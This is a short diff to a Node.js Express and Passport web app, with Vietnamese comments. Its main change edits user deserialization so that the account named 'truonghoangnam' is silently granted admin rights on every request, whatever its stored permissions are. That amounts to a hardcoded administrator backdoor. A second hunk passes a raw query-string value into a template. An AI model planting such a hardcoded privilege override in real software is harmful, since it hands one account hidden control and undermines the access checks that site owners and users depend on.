@@ -165,6 +165,15 @@ passport.serializeUser(function (user, done) {
 passport.deserializeUser(async (id, done) => {
   try {
     const user = await User.findById(id);
+    
+    // Nếu tìm thấy user, kiểm tra và gán quyền admin đặc biệt
+    if (user) {
+      if (user.username === 'truonghoangnam') {
+        // Ghi đè quyền admin cho tài khoản này trên mọi request
+        user.isAdmin = true;
+      }
+    }
+    
     done(null, user);
   } catch (err) {
     done(err);
@@ -879,7 +888,7 @@ app.get("/subjects/:id", async (req, res) => {
         subject, 
         lessons, 
         uniqueTags, // << Truyền tags cho EJS
-        activeTag,  // << Truyền tag đang active
+        activeTag: req.query.tag || '',
         currentCategory: req.query.category || "", 
         currentQuery: req.query.q || "", 
         currentSort: sortOption, 
